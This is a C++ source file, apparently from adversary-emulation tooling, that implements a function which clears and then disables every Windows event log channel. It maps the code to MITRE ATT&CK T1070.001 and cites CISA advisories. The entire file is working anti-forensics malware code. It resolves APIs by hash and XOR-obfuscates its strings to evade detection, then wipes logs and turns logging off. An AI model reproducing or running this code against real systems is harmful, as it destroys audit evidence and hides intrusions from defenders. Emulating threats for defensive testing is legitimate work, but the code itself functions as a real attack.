#include <format>
#include "crypto/xor_obfuscation.hpp"
#include "logger.hpp"
#include "tamper.hpp"
#include "util/string_util.hpp"

namespace tamper {

/*
 * ClearAndDisableEventLogs:
 *      About:
 *          Attempts to clear and disable each available event log channel.
 *          Relevant API calls:
 *              EvtOpenChannelEnum, EvtNextChannelPath, EvtClearLog, EvtOpenChannelConfig,
 *              EvtSetChannelConfigProperty, EvtSaveChannelConfig
 *      Result:
 *          Cleared and disabled Windows event log channels
 *      MITRE ATT&CK Techniques:
 *          T1070.001: Indicator Removal: Clear Windows Event Logs
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 */
void ClearAndDisableEventLogs() {
    DWORD error_code;
    FP_EvtOpenChannelEnum evtOpenChannelEnum = (FP_EvtOpenChannelEnum)winapi_helper::GetAPI(0xa53eb414, XOR_WIDE_LIT(L"wevtapi.dll"), &error_code);
    if (evtOpenChannelEnum == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for EvtOpenChannelEnum. Error code"), error_code));
        return;
    }
    FP_EvtNextChannelPath evtNextChannelPath = (FP_EvtNextChannelPath)winapi_helper::GetAPI(0x7ffc81f9, XOR_WIDE_LIT(L"wevtapi.dll"), &error_code);
    if (evtNextChannelPath == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for EvtNextChannelPath. Error code"), error_code));
        return;
    }
    FP_EvtClearLog evtClearLog = (FP_EvtClearLog)winapi_helper::GetAPI(0xc42939fd, XOR_WIDE_LIT(L"wevtapi.dll"), &error_code);
    if (evtClearLog == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for EvtClearLog. Error code"), error_code));
        return;
    }
    FP_EvtOpenChannelConfig evtOpenChannelConfig = (FP_EvtOpenChannelConfig)winapi_helper::GetAPI(0xeb1fe9d5, XOR_WIDE_LIT(L"wevtapi.dll"), &error_code);
    if (evtOpenChannelConfig == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for EvtOpenChannelConfig. Error code"), error_code));
        return;
    }
    FP_EvtSetChannelConfigProperty evtSetChannelConfigProperty = (FP_EvtSetChannelConfigProperty)winapi_helper::GetAPI(0x5ede5874, XOR_WIDE_LIT(L"wevtapi.dll"), &error_code);
    if (evtSetChannelConfigProperty == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for EvtSetChannelConfigProperty. Error code"), error_code));
        return;
    }
    FP_EvtSaveChannelConfig evtSaveChannelConfig = (FP_EvtSaveChannelConfig)winapi_helper::GetAPI(0x41e67cd2, XOR_WIDE_LIT(L"wevtapi.dll"), &error_code);
    if (evtSaveChannelConfig == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for EvtSaveChannelConfig. Error code"), error_code));
        return;
    }
    FP_EvtClose evtClose = (FP_EvtClose)winapi_helper::GetAPI(0xb8599eaa, XOR_WIDE_LIT(L"wevtapi.dll"), &error_code);
    if (evtClose == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for EvtClose. Error code"), error_code));
        return;
    }
    
    EVT_HANDLE h_channel_enum = evtOpenChannelEnum(NULL, 0);
    if (h_channel_enum == NULL) {
        XorLogger::LogError(std::format("{} {}", XOR_LIT("EvtOpenChannelEnum failed with error code"), GetLastError()));
        return;
    }
    DWORD buf_len = 256; // initial size
    DWORD required_size = buf_len;
    std::vector<wchar_t> buffer(required_size);

    // Loop until EvtNextChannelPath fails with ERROR_NO_MORE_ITEMS
    while(true) {
        if (!evtNextChannelPath(h_channel_enum, buf_len, &buffer[0], &required_size)) {
            error_code = GetLastError();
            if (error_code == ERROR_NO_MORE_ITEMS) {
                break;
            } else if (error_code == ERROR_INSUFFICIENT_BUFFER) {
                // resize buffer
                buf_len = required_size;
                buffer.resize(required_size);
                if (!evtNextChannelPath(h_channel_enum, buf_len, &buffer[0], &required_size)) {
                    XorLogger::LogError(std::format("{} {}", XOR_LIT("EvtNextChannelPath failed with error code"), GetLastError()));
                    break;
                }
            } else {
                XorLogger::LogError(std::format("{} {}", XOR_LIT("EvtNextChannelPath failed with error code"), GetLastError()));
                break;
            }
        }

        // Clear the event log
        LPCWSTR channel_path = (LPCWSTR)(&buffer[0]);
        std::wstring channel_path_wstr(channel_path);
        if (!evtClearLog(NULL, channel_path, NULL, 0)) {
            XorLogger::LogError(std::format(
                "{} {} {} {}", 
                XOR_LIT("EvtClearLog failed for event channel"),
                string_util::wstring_to_string(channel_path_wstr),
                XOR_LIT("with error code"),
                GetLastError()
            ));
        } else {
            XorLogger::LogDebug(std::format(
                "{} {}", 
                XOR_LIT("Successfully cleared event logs from event channel"),
                string_util::wstring_to_string(channel_path_wstr)
            ));
        }

        // Disable event channel
        EVT_HANDLE h_channel_cfg = evtOpenChannelConfig(NULL, channel_path, 0);
        if (h_channel_cfg == NULL) {
            XorLogger::LogError(std::format(
                "{} {} {} {}", 
                XOR_LIT("Failed to get channel config for event channel"),
                string_util::wstring_to_string(channel_path_wstr),
                XOR_LIT("with error code"),
                GetLastError()
            ));
            continue;
        }
        EVT_VARIANT cfg_enabled = {};
        cfg_enabled.Type = EvtVarTypeBoolean;
        cfg_enabled.BooleanVal = FALSE;
        if (!evtSetChannelConfigProperty(h_channel_cfg, EvtChannelConfigEnabled, 0, &cfg_enabled)) {
            XorLogger::LogError(std::format(
                "{} {}. {} {}", 
                XOR_LIT("Failed to disable event channel"),
                string_util::wstring_to_string(channel_path_wstr),
                XOR_LIT("EvtSetChannelConfigProperty gave error code"),
                GetLastError()
            ));
        } else {
            // Save config changes
            if (!evtSaveChannelConfig(h_channel_cfg, 0)) {
                XorLogger::LogError(std::format(
                "{} {}. {} {}", 
                XOR_LIT("Failed to disable event channel"),
                string_util::wstring_to_string(channel_path_wstr),
                XOR_LIT("EvtSaveChannelConfig gave error code"),
                GetLastError()
            ));
            } else {
                XorLogger::LogDebug(std::format(
                    "{} {}", 
                    XOR_LIT("Successfully disabled event channel"),
                    string_util::wstring_to_string(channel_path_wstr)
                ));
            }
        }

        // Close config handle from EvtOpenChannelConfig
        evtClose(h_channel_cfg);
    }

    // Close handle from EvtOpenChannelEnum when done
    evtClose(h_channel_enum);
}

} // namespace